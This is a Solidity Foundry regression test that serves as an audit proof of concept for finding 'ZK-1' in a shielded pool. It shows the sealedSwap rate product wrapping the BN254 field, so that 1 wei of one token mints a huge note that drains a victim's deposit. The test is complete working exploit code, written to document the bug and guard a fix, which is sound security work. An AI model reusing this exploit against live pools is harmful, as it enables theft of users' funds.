// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ZK-1 regression (ZK review 2026-10-11). This test PASSES today because the bug
// is real: it shows the sealedSwap rate product wrapping the field on an
// oracle-bound pair, so 1 wei of assetIn mints ~2.57e38 assetOut and drains a
// real deposit. Sealed swap is off on the live pools (sealedSwapVerifier = 0).
// Before anything re-enables it, fix ZK-1 (amount bits + rate bits <= 252, one
// side of the oracle rate fixed to a scale) and flip this test to expect the
// wrapped swap to revert or be unprovable. Do not delete it.

import {Test} from "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";
import {ShieldPoolPoseidon} from "../../src/ShieldPoolPoseidon.sol";
import {IVerifier} from "../../src/interfaces/IVerifier.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {DualProofVerifier} from "../../src/verifiers/DualProofVerifier.sol";
import {UnshieldVerifier} from "../../src/verifiers/UnshieldVerifier.sol";
import {UnshieldIVerifier} from "../../src/verifiers/UnshieldIVerifier.sol";
import {TransferVerifier} from "../../src/verifiers/TransferVerifier.sol";
import {TransferIVerifier} from "../../src/verifiers/TransferIVerifier.sol";
import {SealedSwapVerifierCurrent} from "./SealedSwapVerifierCurrent.sol";
import {MockERC20} from "../MockERC20.sol";

contract WrapFeed is IAggregatorV3 {
    uint8 public decimals = 8;
    int256 public answer;

    constructor(int256 a) {
        answer = a;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, block.timestamp, block.timestamp, 1);
    }
}

/// IVerifier wrapper for the CURRENT (hardened) sealedSwap circuit, dev setup.
contract SealedSwapIVerifierCurrent is IVerifier {
    SealedSwapVerifierCurrent public immutable g;

    constructor() {
        g = new SealedSwapVerifierCurrent();
    }

    function verify(bytes calldata proof, uint256[] calldata pub) external view returns (bool) {
        if (pub.length != 9) return false;
        (uint256[2] memory a, uint256[2][2] memory b, uint256[2] memory c) =
            abi.decode(proof, (uint256[2], uint256[2][2], uint256[2]));
        uint256[9] memory p;
        for (uint256 i = 0; i < 9; i++) p[i] = pub[i];
        return g.verifyProof(a, b, c, p);
    }
}

/// Deposit verifier for this PoC's setup only: the deposits are not what is
/// under test, so any shieldBound() proof passes.
contract WrapDepositVerifier is IVerifier {
    function verify(bytes calldata, uint256[] calldata) external pure returns (bool) {
        return true;
    }
}

/**
 * Audit ZK-1 PoC: the sealedSwap rate product wraps the BN254 field even with the
 * 128-bit range checks, because on an oracle-bound pair the caller chooses the
 * absolute rates. 1 wei of assetIn mints ~2.57e38 units of assetOut, which then
 * drains the pool's real assetOut deposits through ordinary transfer + unshield
 * (live, matching verifiers). Fixture: circuits/audit-zk/sealed_wrap.mjs.
 */
contract SealedSwapRateWrapTest is Test {
    using stdJson for string;

    address constant ATTACKER = address(0xA11C);
    address constant VICTIM = address(0xB0B);

    function _deployPoseidon() internal returns (address addr) {
        bytes memory bytecode = vm.readFile("test/fixtures/Poseidon2.json").readBytes(".bytecode");
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        require(addr != address(0), "poseidon");
    }

    function _proof(string memory j, string memory k) internal pure returns (bytes memory) {
        uint256[] memory a = j.readUintArray(string.concat(k, ".a"));
        uint256[] memory b0 = j.readUintArray(string.concat(k, ".b[0]"));
        uint256[] memory b1 = j.readUintArray(string.concat(k, ".b[1]"));
        uint256[] memory c = j.readUintArray(string.concat(k, ".c"));
        return abi.encode([a[0], a[1]], [[b0[0], b0[1]], [b1[0], b1[1]]], [c[0], c[1]]);
    }

    function test_sealedSwap_rate_wrap_drains_assetOut() public {
        string memory j = vm.readFile("test/fixtures/auditzk-sealedwrap.json");
        address tokenA = j.readAddress(".tokenA");
        address tokenB = j.readAddress(".tokenB");
        deployCodeTo("MockERC20.sol:MockERC20", tokenA);
        deployCodeTo("MockERC20.sol:MockERC20", tokenB);

        DualProofVerifier dual = new DualProofVerifier(
            new UnshieldIVerifier(new UnshieldVerifier()), new TransferIVerifier(new TransferVerifier())
        );
        ShieldPoolPoseidon pool = new ShieldPoolPoseidon(_deployPoseidon(), address(dual));

        // Owner config: an oracle-bound pair, TSLA-like $250 -> AMZN-like $190, 1% band.
        pool.setSealedSwapVerifier(address(new SealedSwapIVerifierCurrent()));
        pool.setPriceFeed(tokenA, address(new WrapFeed(250e8)));
        pool.setPriceFeed(tokenB, address(new WrapFeed(190e8)));
        pool.setOracleConfig(address(0), 0, 1 days, 100);
        pool.setOracleRatePair(tokenA, tokenB, true);
        // what endSetup() requires: a deposit verifier and deposit limits on
        pool.setShieldVerifier(address(new WrapDepositVerifier()));
        pool.turnOnDepositLimits();
        pool.setDepositLimit(tokenA, type(uint128).max, type(uint128).max);
        pool.setDepositLimit(tokenB, type(uint128).max, type(uint128).max);
        pool.endSetup();

        // idx0: attacker deposits 1 wei of A.  idx1: victim deposits 1000 B.
        MockERC20(tokenA).mint(ATTACKER, 1);
        vm.startPrank(ATTACKER);
        MockERC20(tokenA).approve(address(pool), 1);
        pool.shieldBound(tokenA, 1, j.readBytes32(".cIn"), "");
        vm.stopPrank();
        uint256 victimAmt = j.readUint(".victimAmt");
        MockERC20(tokenB).mint(VICTIM, victimAmt);
        vm.startPrank(VICTIM);
        MockERC20(tokenB).approve(address(pool), victimAmt);
        pool.shieldBound(tokenB, victimAmt, j.readBytes32(".cVictim"), "");
        vm.stopPrank();

        // Attacker: sealed swap of 1 wei A at the wrapped (ratio-correct) rates.
        uint256 rateIn = j.readUint(".rateIn");
        uint256 rateOut = j.readUint(".rateOut");
        assertLt(rateIn, uint256(type(uint128).max));
        assertLt(rateOut, uint256(type(uint128).max));
        vm.prank(ATTACKER);
        pool.sealedSwap(
            _proof(j, ".swap"),
            j.readBytes32(".swap.root"),
            j.readBytes32(".swap.nullifier"),
            j.readBytes32(".swap.cOut"),
            j.readBytes32(".swap.cChg"),
            tokenA,
            tokenB,
            1,
            rateIn,
            rateOut
        );
        emit log_named_uint("minted assetOut note amount (raw units)", j.readUint(".amountOut"));

        // Split the minted note and unshield exactly the victim's deposit.
        bytes32[2] memory outs = [j.readBytes32(".xfer.c0"), j.readBytes32(".xfer.c1")];
        vm.prank(ATTACKER);
        pool.transfer(_proof(j, ".xfer"), j.readBytes32(".xfer.root"), j.readBytes32(".xfer.nullifier"), outs);
        vm.prank(ATTACKER);
        pool.unshield(_proof(j, ".unsh"), j.readBytes32(".unsh.root"), j.readBytes32(".unsh.nullifier"), tokenB, ATTACKER, victimAmt);

        assertEq(MockERC20(tokenB).balanceOf(ATTACKER), victimAmt, "attacker took the victim's B");
        assertEq(MockERC20(tokenB).balanceOf(address(pool)), 0, "pool B inventory drained");
        assertEq(pool.deposited(tokenB), 0);
        emit log_named_uint("attacker spent (wei of A)", 1);
        emit log_named_uint("attacker received (wei of B)", MockERC20(tokenB).balanceOf(ATTACKER));
    }
}
